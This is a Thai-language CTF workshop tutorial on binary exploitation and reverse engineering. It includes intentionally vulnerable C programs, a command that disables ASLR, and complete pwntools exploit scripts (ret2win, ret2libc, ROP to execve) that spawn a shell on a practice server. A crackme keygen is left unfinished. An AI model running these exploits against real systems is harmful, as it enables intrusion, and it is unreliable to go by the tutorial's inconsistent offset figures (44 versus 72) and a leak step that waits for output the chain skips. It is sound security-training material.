# Part 080: CTF Challenges Workshop

## บทนำ: CTF คืออะไร?

CTF (Capture The Flag) คือการแข่งขันด้าน Cybersecurity ที่ผู้เข้าแข่งขันต้องแก้ปัญหา (challenges) เพื่อหา "flag" ซึ่งมักอยู่ในรูปแบบ `flag{...}` หรือ `CTF{...}` การแข่งขัน CTF เป็นวิธีที่ยอดเยี่ยมในการฝึกทักษะด้าน security แบบ hands-on

### ประเภทของ CTF

CTF แบ่งออกเป็นหลายรูปแบบหลัก:

**1. Jeopardy-style CTF**
- ผู้เข้าแข่งขันเลือกทำ challenge จาก category ต่างๆ
- แต่ละ challenge มีคะแนนที่กำหนดไว้ (เช่น 100, 200, 500 คะแนน)
- challenge ที่ยากกว่ามักมีคะแนนมากกว่า
- ตัวอย่าง: PicoCTF, DCTF, CyberApocalypse

**2. Attack-Defense CTF**
- แต่ละทีมมี server ของตัวเอง
- ต้องป้องกัน server ตัวเองและโจมตี server ของทีมอื่น
- ตัวอย่าง: DEF CON CTF Finals

**3. King of the Hill**
- ผู้เข้าแข่งขันต้องยึดครอง "hill" และป้องกันไม่ให้ทีมอื่นเข้ามา

---

## หมวดหมู่หลักใน CTF (Categories)

### 1. Pwn (Binary Exploitation)

หมวดนี้เกี่ยวกับการโจมตีโปรแกรม binary เพื่อให้ทำงานตามที่เราต้องการ เช่น:
- **Buffer Overflow (BOF)**: เขียนข้อมูลเกิน buffer ที่กำหนด
- **ret2win**: overflow เพื่อกระโดดไปยัง function ที่ต้องการ
- **ret2libc**: ใช้ฟังก์ชันจาก libc (เช่น system("/bin/sh"))
- **ROP Chains**: เรียง gadgets เพื่อสร้าง exploit
- **Format String**: ใช้ format string vulnerability เพื่ออ่าน/เขียน memory
- **Heap Exploitation**: โจมตี heap allocator (malloc/free)
- **Use-After-Free (UAF)**: ใช้ pointer หลัง free

### 2. Reverse Engineering (Rev)

หมวดนี้เกี่ยวกับการวิเคราะห์โปรแกรมโดยไม่มี source code:
- **Crackme**: หา serial/password ที่ถูกต้อง
- **Deobfuscation**: ถอดรหัส obfuscated code
- **VM/Bytecode**: วิเคราะห์ virtual machine หรือ bytecode ที่กำหนดขึ้นมา
- **Anti-debugging**: bypass anti-debug techniques
- **Packer**: unpack binary ที่ถูก pack

### 3. Cryptography (Crypto)

หมวดนี้เกี่ยวกับการเข้ารหัสและถอดรหัส:
- **Classical Ciphers**: Caesar, Vigenere, Substitution
- **Modern Crypto**: RSA, AES, DES
- **Hash Cracking**: MD5, SHA1
- **Side-channel attacks**: timing attacks, padding oracle
- **Elliptic Curve**: ECDSA vulnerabilities

### 4. Miscellaneous (Misc)

challenge ที่ไม่จัดอยู่ในหมวดอื่นๆ:
- **Steganography**: ซ่อนข้อมูลในรูปภาพ/เสียง
- **Forensics**: วิเคราะห์ไฟล์, pcap, memory dumps
- **OSINT**: หาข้อมูลจาก internet
- **Web**: SQL injection, XSS, SSRF, etc.
- **Trivia**: ความรู้ทั่วไปด้าน security

### 5. Web

- **SQL Injection**: ยิง SQL ผ่าน input
- **XSS (Cross-Site Scripting)**: inject JavaScript
- **SSRF (Server-Side Request Forgery)**: ให้ server request ไปยัง internal services
- **XXE**: XML External Entity injection
- **Command Injection**: inject OS commands

---

## เครื่องมือ (Essential Tools)

### การติดตั้งเครื่องมือพื้นฐาน

```bash
# ติดตั้ง pwntools
pip install pwntools

# ติดตั้ง ROPgadget
pip install ROPgadget

# ติดตั้ง one_gadget (ต้องมี Ruby)
gem install one_gadget

# ติดตั้ง pwndbg (GDB plugin)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# ติดตั้ง checksec
pip install checksec.py
# หรือ
sudo apt install checksec

# ติดตั้ง patchelf (สำหรับแก้ไข ELF headers)
sudo apt install patchelf

# ติดตั้ง glibc-all-in-one (สำหรับ libc debugging)
git clone https://github.com/matrix1001/glibc-all-in-one
```

---

### checksec: ตรวจสอบ Security Features

`checksec` ใช้ดู security features ที่ binary มีหรือไม่มี:

```bash
checksec --file=./challenge
```

ตัวอย่าง output:
```
[*] '/home/user/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**ความหมายของแต่ละ field:**

| Feature | Enabled | Disabled |
|---------|---------|----------|
| RELRO | GOT เป็น read-only | GOT เขียนได้ |
| Stack Canary | มี canary ป้องกัน BOF | ไม่มีการป้องกัน |
| NX | ไม่ execute stack | stack executable |
| PIE | base address random | base address คงที่ |
| ASLR | ที่อยู่ memory สุ่ม | ที่อยู่ memory คงที่ |

---

### file: วิเคราะห์ประเภทไฟล์

```bash
file ./challenge
```

ตัวอย่าง output:
```
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, not stripped
```

ข้อมูลที่ได้:
- **64-bit หรือ 32-bit**: กำหนดขนาด pointer (8 bytes หรือ 4 bytes)
- **LSB/MSB**: Little-endian หรือ Big-endian
- **dynamically/statically linked**: มี dependency กับ library ภายนอกหรือไม่
- **stripped/not stripped**: มี symbol information หรือไม่

---

### strings: หาข้อความที่ซ่อนอยู่

```bash
# หา printable strings ทั้งหมดที่ยาวอย่างน้อย 8 ตัวอักษร
strings -n 8 ./challenge

# หาและแสดง offset ด้วย
strings -o ./challenge

# หา flag pattern
strings ./challenge | grep -i flag
strings ./challenge | grep -E 'flag\{.*\}'

# หา URL, password, key
strings ./challenge | grep -i 'http\|pass\|key\|secret'
```

---

### ltrace และ strace: Trace Library/System Calls

```bash
# ltrace - trace library calls
ltrace ./challenge

# strace - trace system calls
strace ./challenge

# ใส่ input ผ่าน pipe
echo "test_input" | ltrace ./challenge

# ดู syscalls เฉพาะ
strace -e trace=read,write,open ./challenge

# ltrace พร้อม string limit
ltrace -s 100 ./challenge
```

ตัวอย่าง ltrace output:
```
strcmp("AAAA", "s3cr3t_p4ss") = -1
puts("Wrong password!") = 16
```

เห็นได้ชัดว่า password ที่ถูกต้องคือ `s3cr3t_p4ss`

---

### GDB + pwndbg: Dynamic Analysis

```bash
# เปิด GDB พร้อม binary
gdb ./challenge

# คำสั่งพื้นฐาน
(gdb) run              # รันโปรแกรม
(gdb) run < input.txt  # รันพร้อม input จากไฟล์
(gdb) break main       # วาง breakpoint ที่ main
(gdb) break *0x401234  # วาง breakpoint ที่ address
(gdb) continue         # ทำงานต่อจาก breakpoint
(gdb) nexti            # next instruction (no step into)
(gdb) stepi            # step instruction (step into)
(gdb) info registers   # ดู registers ทั้งหมด
(gdb) x/20xg $rsp      # ดู stack 20 qwords (64-bit)
(gdb) x/s 0x601234     # ดูเป็น string
(gdb) p $rip           # print register
(gdb) disassemble main # disassemble function
```

**pwndbg commands เพิ่มเติม:**

```bash
(pwndbg) cyclic 100       # สร้าง pattern 100 bytes
(pwndbg) cyclic -l 0x6161 # หา offset ของ pattern
(pwndbg) checksec         # ดู security features
(pwndbg) vmmap            # ดู memory map
(pwndbg) search -s "flag" # ค้นหา string ใน memory
(pwndbg) got              # ดู GOT table
(pwndbg) plt              # ดู PLT table
(pwndbg) heap             # ดู heap chunks
(pwndbg) stack 20         # ดู stack 20 entries
(pwndbg) rop              # หา ROP gadgets
(pwndbg) telescope $rsp   # ดู stack แบบ pretty
```

---

### ROPgadget: หา ROP Gadgets

```bash
# หา gadgets ทั้งหมด
ROPgadget --binary ./challenge

# หา gadget เฉพาะ
ROPgadget --binary ./challenge --ropchain

# หา specific gadget
ROPgadget --binary ./challenge | grep "pop rdi"
ROPgadget --binary ./challenge | grep "ret$"

# หา gadget จาก libc
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"

# สร้าง ROP chain อัตโนมัติ
ROPgadget --binary ./challenge --ropchain
```

---

### one_gadget: หา One-Gadget RCE

`one_gadget` หา gadget ใน libc ที่เมื่อ jump ไปแล้วจะได้ shell โดยตรง:

```bash
# หา one_gadgets ใน libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# ตัวอย่าง output:
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

one_gadget /lib/x86_64-linux-gnu/libc.so.6 -l 1  # relax constraints
```

---

## pwntools: Python Library สำหรับ CTF

### การ import และ setup

```python
from pwn import *

# กำหนด context
context.arch = 'amd64'       # หรือ 'i386', 'arm'
context.os = 'linux'
context.log_level = 'debug'  # 'info', 'warning', 'error'
context.terminal = ['tmux', 'splitw', '-h']  # สำหรับ debug
```

### การเชื่อมต่อ (Connection)

```python
# เชื่อมต่อกับ local binary
p = process('./challenge')

# เชื่อมต่อกับ remote server
p = remote('ctf.example.com', 4444)

# เชื่อมต่อ แต่ debug ด้วย GDB
p = gdb.debug('./challenge', gdbscript='''
    break main
    continue
''')

# เปิด binary ด้วย specific libc
p = process('./challenge', env={'LD_PRELOAD': './libc.so.6'})
```

### การส่งและรับข้อมูล

```python
# ส่งข้อมูล
p.send(b'data')           # ส่ง bytes (ไม่มี newline)
p.sendline(b'data')       # ส่ง bytes + newline
p.sendafter(b'prompt', b'data')    # ส่งหลังจากรับ prompt
p.sendlineafter(b'prompt', b'data') # ส่ง + newline หลัง prompt

# รับข้อมูล
data = p.recv(1024)        # รับสูงสุด 1024 bytes
data = p.recvline()        # รับจนถึง newline
data = p.recvuntil(b'>')   # รับจนถึง delimiter
data = p.recvall()         # รับทั้งหมดจนปิด

# เข้าสู่ interactive mode
p.interactive()            # พิมพ์คำสั่งเองได้
```

### Packing และ Unpacking

```python
# 64-bit (8 bytes)
packed = p64(0x401234)     # pack เป็น little-endian bytes
value  = u64(b'\x34\x12\x40\x00\x00\x00\x00\x00')  # unpack

# 32-bit (4 bytes)
packed = p32(0x401234)     # pack 32-bit
value  = u32(b'\x34\x12\x40\x00')   # unpack 32-bit

# ตัวอย่างการใช้งาน
payload  = b'A' * 40
payload += p64(0xdeadbeef)   # overwrite return address
```

### Cyclic Pattern (หา Offset)

```python
# สร้าง pattern 200 bytes
pattern = cyclic(200)
print(pattern)
# b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama...'

# หา offset จาก value ที่ crash
offset = cyclic_find(0x6161616c)  # value ที่อยู่ใน RIP
print(f"Offset: {offset}")  # ได้ 44

# หา offset จาก bytes
offset = cyclic_find(b'laaa')
```

### ELF: วิเคราะห์ Binary

```python
elf = ELF('./challenge')

# หา address ของ symbols
print(hex(elf.sym['main']))         # address ของ main
print(hex(elf.sym['win']))          # address ของ win function
print(hex(elf.got['puts']))         # GOT address ของ puts
print(hex(elf.plt['puts']))         # PLT address ของ puts
print(hex(elf.sym['__stack_chk_fail']))  # canary handler

# ดู binary info
print(elf.arch)      # 'amd64'
print(elf.bits)      # 64
print(elf.pie)       # True/False
print(elf.canary)    # True/False
print(elf.nx)        # True/False
```

### ROP: สร้าง ROP Chain

```python
elf = ELF('./challenge')
rop = ROP(elf)

# หา gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

# สร้าง ROP chain
rop.raw(pop_rdi)
rop.raw(elf.sym['flag_string'])
rop.raw(elf.plt['puts'])

# หรือใช้ shorthand
rop.puts(elf.sym['flag_string'])

payload = flat(
    b'A' * 72,   # padding
    rop.chain()  # ROP chain
)
```

---

## Pwn Challenge Methodology

### ขั้นตอนการทำ Pwn Challenge

```
1. checksec     → ดู security features
2. file         → ดูประเภทไฟล์ (32/64-bit, linked, stripped)
3. strings      → หา hints, flags, passwords
4. run          → รันปกติดูพฤติกรรม
5. ltrace/strace → ดู library/system calls
6. static analysis (Ghidra/IDA) → ดู decompiled code
7. dynamic analysis (GDB) → ดู runtime behavior
8. find vulnerability → หาช่องโหว่
9. craft exploit → เขียน exploit
10. test locally → ทดสอบบนเครื่องตัวเอง
11. adjust for remote → ปรับ offset, addresses สำหรับ remote
12. get flag!
```

---

## Challenge 1: Simple Buffer Overflow (ret2win)

### โจทย์

Binary 64-bit ที่มีช่องโหว่ buffer overflow แบบง่าย ไม่มี ASLR, ไม่มี canary, มี NX

ไฟล์: `vuln1.c`

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");
    // หรือ
    // FILE *fp = fopen("flag.txt", "r");
    // char flag[64];
    // fgets(flag, 64, fp);
    // printf("Flag: %s\n", flag);
}

void vulnerable() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);    // ช่องโหว่! gets ไม่ check ขนาด
}

int main() {
    vulnerable();
    return 0;
}
```

**Compile:**
```bash
gcc -o vuln1 vuln1.c \
    -fno-stack-protector \
    -no-pie \
    -z execstack \
    -m64
```

หรือปิด ASLR ชั่วคราว:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### ขั้นตอนที่ 1: ตรวจสอบด้วย checksec

```bash
$ checksec --file=./vuln1

[*] '/home/user/vuln1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found     ← ดี! ไม่มี canary
    NX:       NX enabled          ← มี NX (ไม่ execute shellcode บน stack)
    PIE:      No PIE (0x400000)   ← ดี! address คงที่
```

### ขั้นตอนที่ 2: วิเคราะห์ด้วย GDB

```bash
$ gdb -q ./vuln1

(pwndbg) disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x0000000000401176 <+0>:     push   rbp
   0x0000000000401177 <+1>:     mov    rbp,rsp
   0x000000000040117a <+4>:     sub    rsp,0x40    ← 0x40 = 64 bytes สำหรับ buffer
   0x000000000040117e <+8>:     lea    rdi,[rip+0xe7f]
   0x0000000000401185 <+15>:    call   0x401030 <printf@plt>
   0x000000000040118a <+20>:    lea    rdi,[rbp-0x40]  ← &buffer
   0x000000000040118e <+24>:    call   0x401040 <gets@plt>
   0x0000000000401193 <+29>:    nop
   0x0000000000401194 <+30>:    leave
   0x0000000000401195 <+31>:    ret

(pwndbg) print win
$1 = {<text variable, no debug info>} 0x401152 <win>
```

### ขั้นตอนที่ 3: หา Offset

```bash
(pwndbg) cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

(pwndbg) run
Enter input: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama...

Program received signal SIGSEGV
RIP: 0x6161616c ('laaa')

(pwndbg) cyclic -l 0x6161616c
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

**Buffer = 64 bytes, saved RBP = 8 bytes, total = 72 bytes**

หรือคิดแบบนี้:
```
[buffer: 64 bytes][saved RBP: 8 bytes][return address: 8 bytes]
```
Offset = 64 + 8 = **72 bytes**

### ขั้นตอนที่ 4: หา Address ของ win()

```bash
(pwndbg) print win
$1 = {<text variable, no debug info>} 0x401152 <win>

# หรือใช้ nm
$ nm vuln1 | grep win
0000000000401152 T win
```

### ขั้นตอนที่ 5: สร้าง Exploit

```python
#!/usr/bin/env python3
# exploit_challenge1.py - ret2win exploit

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'  # uncomment เพื่อ debug

# เชื่อมต่อกับ binary
# p = process('./vuln1')
p = remote('ctf.example.com', 4444)

# โหลด ELF เพื่อหา symbol addresses
elf = ELF('./vuln1')

# หา address ของ win function
win_addr = elf.sym['win']
print(f"[*] win() address: {hex(win_addr)}")

# offset จนถึง return address
OFFSET = 72

# stack alignment: ใน 64-bit บางครั้งต้องการ alignment 16 bytes
# ถ้า system() crash ให้เพิ่ม ret gadget
ret_gadget = 0x40101a  # หาจาก ROPgadget --binary ./vuln1 | grep "ret$"

# สร้าง payload
payload  = b'A' * OFFSET
payload += p64(win_addr)

# ส่ง payload
print(f"[*] Sending payload...")
p.sendlineafter(b'Enter input: ', payload)

# เข้า interactive mode เพื่อพิมพ์คำสั่ง
p.interactive()
```

**รัน exploit:**
```bash
python3 exploit_challenge1.py
```

ผล:
```
[*] win() address: 0x401152
[*] Sending payload...
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag.txt
flag{buff3r_0v3rfl0w_1s_s0_fun}
```

### Stack Layout ขณะ Overflow

```
ก่อน overflow:
+------------------+  <- rsp (สูง)
|  return address  |
+------------------+
|   saved RBP      |
+------------------+
|                  |
|   buffer[64]     |
|                  |
+------------------+  <- rsp + 0 (ต่ำ)

หลัง overflow:
+------------------+
| address ของ win()|  ← เราเขียนทับ!
+------------------+
|   AAAAAAAAx8     |  ← ทับ saved RBP
+------------------+
|   AAAA...x64     |  ← เติมเต็ม buffer
+------------------+
```

---

## Challenge 2: ret2libc (ASLR + NX)

### โจทย์

Binary 64-bit ที่มี NX enabled และ ASLR เปิดอยู่ ไม่สามารถใช้ shellcode บน stack ได้ ต้องใช้ libc functions แทน

ไฟล์: `vuln2.c`

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vuln() {
    char buffer[128];
    printf("Give me your name: ");
    read(0, buffer, 256);    // อ่านมากกว่า buffer!
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Welcome!\n");
    vuln();
    printf("Bye!\n");
    return 0;
}
```

**Compile:**
```bash
gcc -o vuln2 vuln2.c \
    -fno-stack-protector \
    -no-pie \
    -m64
# ASLR เปิดอยู่ (default ของ Linux)
```

### ขั้นตอนที่ 1: checksec

```bash
$ checksec ./vuln2
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found     ← ดี
    NX:       NX enabled          ← ไม่ execute stack
    PIE:      No PIE (0x400000)   ← binary อยู่ที่ address คงที่
    ASLR:     Enabled             ← libc address สุ่ม!
```

### ขั้นตอนที่ 2: แนวคิด ret2libc

เนื่องจาก ASLR ทำให้ address ของ libc เปลี่ยนทุกครั้ง เราต้องทำ 2 ขั้นตอน:

1. **Leak libc address**: ใช้ puts หรือ printf เพื่อ leak address จาก GOT
2. **Calculate libc base**: นำ leaked address ไปลบกับ offset ของ function นั้นใน libc
3. **Call system("/bin/sh")**: คำนวณ address ของ system และ "/bin/sh" จาก libc base

```
libc_base = leaked_puts - puts_offset_in_libc
system_addr = libc_base + system_offset_in_libc
binsh_addr  = libc_base + binsh_offset_in_libc
```

### ขั้นตอนที่ 3: หา Gadgets

```bash
# หา "pop rdi; ret" gadget (สำหรับ argument แรก)
ROPgadget --binary ./vuln2 | grep "pop rdi"
# 0x00000000004012a3 : pop rdi ; ret

# หา "ret" gadget (สำหรับ stack alignment)
ROPgadget --binary ./vuln2 | grep "^0.*ret$"
# 0x000000000040101a : ret
```

### ขั้นตอนที่ 4: หา Offset ใน libc

```bash
# วิธีที่ 1: ใช้ pwntools
python3 -c "from pwn import *; libc = ELF('/lib/x86_64-linux-gnu/libc.so.6'); print(hex(libc.sym['puts'])); print(hex(libc.sym['system'])); print(hex(next(libc.search(b'/bin/sh'))))"

# วิธีที่ 2: ใช้ readelf
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts"
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"

# วิธีที่ 3: ใช้ nm
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep puts
```

### ขั้นตอนที่ 5: สร้าง Exploit

```python
#!/usr/bin/env python3
# exploit_challenge2.py - ret2libc exploit

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# p = process('./vuln2')
p = remote('ctf.example.com', 4445)

elf  = ELF('./vuln2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# สำหรับ remote ให้ใช้ libc ที่ server ใช้
# libc = ELF('./libc.so.6')

# =========================================
# Gadgets (addresses คงที่ เพราะ no-PIE)
# =========================================
POP_RDI = 0x4012a3   # pop rdi ; ret
RET     = 0x40101a   # ret (stack alignment)

# =========================================
# ขั้นตอนที่ 1: Leak libc address
# =========================================
OFFSET = 136  # 128 (buffer) + 8 (saved RBP)

# ROP chain: puts(got['puts']) แล้วกลับมา vuln() เพื่อ exploit อีกครั้ง
payload1  = b'A' * OFFSET
payload1 += p64(POP_RDI)
payload1 += p64(elf.got['puts'])    # argument: address ของ GOT entry ของ puts
payload1 += p64(elf.plt['puts'])    # call puts เพื่อ print ค่าจาก GOT
payload1 += p64(elf.sym['main'])    # กลับมา main เพื่อ exploit รอบ 2

# ส่ง payload ที่ 1
p.sendlineafter(b'Give me your name: ', payload1)

# รับ leaked address
p.recvuntil(b'Bye!\n')  # รอ output ก่อน
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"[*] Leaked puts@GLIBC: {hex(leaked_puts)}")

# =========================================
# ขั้นตอนที่ 2: คำนวณ libc base
# =========================================
libc.address = leaked_puts - libc.sym['puts']
print(f"[*] libc base: {hex(libc.address)}")

system_addr = libc.sym['system']
binsh_addr  = next(libc.search(b'/bin/sh'))
print(f"[*] system(): {hex(system_addr)}")
print(f"[*] '/bin/sh': {hex(binsh_addr)}")

# =========================================
# ขั้นตอนที่ 3: เรียก system("/bin/sh")
# =========================================
payload2  = b'A' * OFFSET
payload2 += p64(RET)          # stack alignment (16-byte align)
payload2 += p64(POP_RDI)
payload2 += p64(binsh_addr)   # argument: "/bin/sh"
payload2 += p64(system_addr)  # call system

p.sendlineafter(b'Give me your name: ', payload2)

p.interactive()
```

### ทำความเข้าใจ GOT/PLT

```
Program Linkage Table (PLT) - ฝั่ง binary
Global Offset Table (GOT)   - ฝั่ง dynamic linker

เมื่อโปรแกรมเรียก puts() ครั้งแรก:
1. call puts@plt
2. PLT jump ไปที่ GOT[puts] (ยังไม่ resolve = ชี้กลับมา PLT)
3. PLT เรียก _dl_runtime_resolve
4. linker หา address จริงของ puts ใน libc
5. เก็บ address ใน GOT[puts]

ครั้งต่อไปที่เรียก puts():
1. call puts@plt
2. PLT jump ไปที่ GOT[puts]
3. GOT[puts] ชี้ไปที่ puts จริงๆ ใน libc

เราอ่าน GOT[puts] ได้ → รู้ว่า puts อยู่ที่ไหนใน libc
→ libc base = puts_address - puts_offset
```

---

## Challenge 3: ROP Chain (ASLR + NX + no-PIE)

### โจทย์

สร้าง ROP chain เพื่อ call `execve("/bin/sh", NULL, NULL)` ด้วย syscall โดยตรง

```c
// vuln3.c
#include <stdio.h>

void vuln() {
    char buf[64];
    read(0, buf, 512);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

```bash
gcc -o vuln3 vuln3.c -fno-stack-protector -no-pie -m64
```

### แนวคิด ROP to execve

execve syscall ต้องการ:
- `rax = 59` (SYS_execve)
- `rdi = pointer to "/bin/sh"`
- `rsi = NULL`
- `rdx = NULL`
- `syscall`

### สร้าง Exploit

```python
#!/usr/bin/env python3
# exploit_challenge3.py - ROP chain to execve syscall

from pwn import *

context.arch = 'amd64'

p = process('./vuln3')
elf = ELF('./vuln3')
rop = ROP(elf)

# ========================================
# หา Gadgets
# ========================================
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall'])[0]

print(f"pop rax: {hex(POP_RAX)}")
print(f"pop rdi: {hex(POP_RDI)}")
print(f"pop rsi: {hex(POP_RSI)}")
print(f"pop rdx: {hex(POP_RDX)}")
print(f"syscall: {hex(SYSCALL)}")

# ========================================
# หาที่อยู่เขียน "/bin/sh"
# เนื่องจาก no-PIE binary มี writable section ที่ address คงที่
# ========================================
# หา .bss section (writable, zeroed)
bss_addr = elf.bss()
print(f".bss: {hex(bss_addr)}")

# ต้องเขียน "/bin/sh\x00" ลง bss ก่อน
# ใช้ read() syscall เพื่อเขียน
# rax=0 (SYS_read), rdi=0 (stdin), rsi=bss_addr, rdx=8

OFFSET = 72

# ========================================
# ROP chain ที่ 1: เขียน "/bin/sh" ลง .bss
# ========================================
rop_write  = b'A' * OFFSET
rop_write += p64(POP_RAX) + p64(0)          # rax = 0 (SYS_read)
rop_write += p64(POP_RDI) + p64(0)          # rdi = 0 (stdin)
rop_write += p64(POP_RSI) + p64(bss_addr)   # rsi = bss_addr
rop_write += p64(POP_RDX) + p64(8)          # rdx = 8 bytes
rop_write += p64(SYSCALL)

# ========================================
# ROP chain ที่ 2: execve("/bin/sh", NULL, NULL)
# ========================================
rop_exec   = p64(POP_RAX) + p64(59)          # rax = 59 (SYS_execve)
rop_exec  += p64(POP_RDI) + p64(bss_addr)    # rdi = &"/bin/sh"
rop_exec  += p64(POP_RSI) + p64(0)           # rsi = NULL
rop_exec  += p64(POP_RDX) + p64(0)           # rdx = NULL
rop_exec  += p64(SYSCALL)

# รวม chains
full_payload = rop_write + rop_exec

p.send(full_payload)

# ส่ง "/bin/sh\x00" สำหรับ read() ที่ ROP เรียก
p.send(b'/bin/sh\x00')

p.interactive()
```

### ถ้าหา Gadgets บางตัวไม่ได้ ใช้ libc

```python
#!/usr/bin/env python3
# exploit_challenge3_libc.py

from pwn import *

context.arch = 'amd64'

p = process('./vuln3')
elf  = ELF('./vuln3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ใช้วิธีเดียวกับ challenge2 (leak libc, แล้ว call system)
# ...

# หรือใช้ one_gadget
# $ one_gadget /lib/x86_64-linux-gnu/libc.so.6
ONE_GADGET_OFFSET = 0x4f3d5  # ตัวอย่าง offset

# หลัง leak libc base
libc.address = leaked_addr - libc.sym['puts']
one_gadget = libc.address + ONE_GADGET_OFFSET

payload  = b'A' * OFFSET
payload += p64(one_gadget)

p.send(payload)
p.interactive()
```

---

## Reverse Engineering Challenges

### เครื่องมือสำหรับ Reverse Engineering

**Static Analysis:**
- **Ghidra** (free, NSA): decompiler + disassembler
- **IDA Pro** (commercial): industry standard
- **Binary Ninja** (commercial/community): modern decompiler
- **radare2/Cutter** (free): comprehensive RE framework
- **objdump**: GNU disassembler พื้นฐาน

**Dynamic Analysis:**
- **GDB + pwndbg/peda**: debugging
- **x64dbg/x32dbg**: Windows debugger
- **ltrace/strace**: trace calls
- **Frida**: dynamic instrumentation

```bash
# Ghidra command line
~/ghidra/support/analyzeHeadless /tmp/ghidra_proj project \
    -import ./challenge \
    -postScript PrintFunctionNames.java

# radare2 พื้นฐาน
r2 ./challenge
> aaa            # analyze all
> afl            # list functions
> pdf @ main     # print disassembly of main
> pdg @ main     # print decompiled main (ถ้ามี r2ghidra)
> VV             # visual mode
```

---

## Rev Challenge 1: Crackme (Serial Check)

### โจทย์

Binary ที่รับ serial number แล้วตรวจสอบว่าถูกต้องหรือไม่

```c
// crackme1.c (โค้ดที่ไม่มี source)
#include <stdio.h>
#include <string.h>

int check_serial(const char *input) {
    // Algorithm ที่ซ่อนอยู่
    if (strlen(input) != 16) return 0;
    
    int sum = 0;
    for (int i = 0; i < 16; i++) {
        sum += input[i];
    }
    
    if (sum != 1337) return 0;
    if (input[0] != 'C') return 0;
    if (input[15] != '!') return 0;
    
    // XOR check
    int xor_val = 0;
    for (int i = 0; i < 8; i++) {
        xor_val ^= input[i] ^ input[i+8];
    }
    if (xor_val != 0x42) return 0;
    
    return 1;
}

int main() {
    char serial[64];
    printf("Enter serial: ");
    scanf("%63s", serial);
    
    if (check_serial(serial)) {
        printf("Correct! Flag: flag{%s}\n", serial);
    } else {
        printf("Wrong serial!\n");
    }
    return 0;
}
```

### วิธีที่ 1: Static Analysis

```bash
# ดู disassembly ด้วย objdump
objdump -d -M intel ./crackme1 | less

# ดูด้วย Ghidra
# เปิด Ghidra → Import crackme1 → Analyze → ดู decompiled check_serial
```

Ghidra จะ decompile เป็นอะไรประมาณนี้:
```c
bool check_serial(char *input) {
    if (strlen(input) != 0x10) return false;
    
    int sum = 0;
    for (int i = 0; i < 0x10; i++)
        sum += (int)input[i];
    
    if (sum != 0x539) return false;
    if (input[0] != 0x43) return false;  // 'C'
    if (input[0xf] != 0x21) return false; // '!'
    
    int xor_val = 0;
    for (int i = 0; i < 8; i++)
        xor_val ^= input[i] ^ input[i+8];
    
    if (xor_val != 0x42) return false;
    return true;
}
```

### วิธีที่ 2: Dynamic Analysis ด้วย GDB

```bash
(pwndbg) break check_serial
(pwndbg) run
Enter serial: AAAAAAAAAAAAAAAA

(pwndbg) disassemble check_serial
# ดูแต่ละ comparison และหาค่าที่ต้องการ

# หรือใช้ ltrace
ltrace ./crackme1
Enter serial: AAAAAAAAAAAAAAAA
strlen("AAAAAAAAAAAAAAAA") = 16
# ผ่าน length check
# ...
```

### วิธีที่ 3: เขียน Keygen

```python
#!/usr/bin/env python3
# keygen1.py - สร้าง serial ที่ถูกต้อง

# เงื่อนไข:
# 1. length = 16
# 2. sum of all chars = 1337
# 3. input[0] = 'C' (ASCII 67)
# 4. input[15] = '!' (ASCII 33)
# 5. XOR check: XOR(input[i] ^ input[i+8]) for i in 0..7 = 0x42

# เริ่มด้วย fixed chars
serial = ['A'] * 16  # placeholder
serial[0]  = 'C'   # ASCII 67
serial[15] = '!'   # ASCII 33

# คำนวณ sum ที่ต้องการสำหรับตัวกลาง 14 ตัว
target_sum = 1337
fixed_sum  = ord('C') + ord('!')  # 67 + 33 = 100
middle_sum = target_sum - fixed_sum  # 1237

# เติมตัวกลาง 14 ตัว (index 1-14)
# ใช้ 'A' (65) เป็นพื้นฐาน
# 14 * 65 = 910
# ต้องการอีก 1237 - 910 = 327
# เพิ่ม 327 ให้ index 1 (serial[1] = 65 + 327 = ?)
# 327 เกิน ASCII range... แบ่งกระจาย

# ลองกระจาย
remaining = middle_sum
for i in range(1, 15):
    serial[i] = chr(min(remaining // (14 - i + 1), 126))
    remaining -= ord(serial[i])

# แก้ตัวสุดท้ายในกลุ่ม
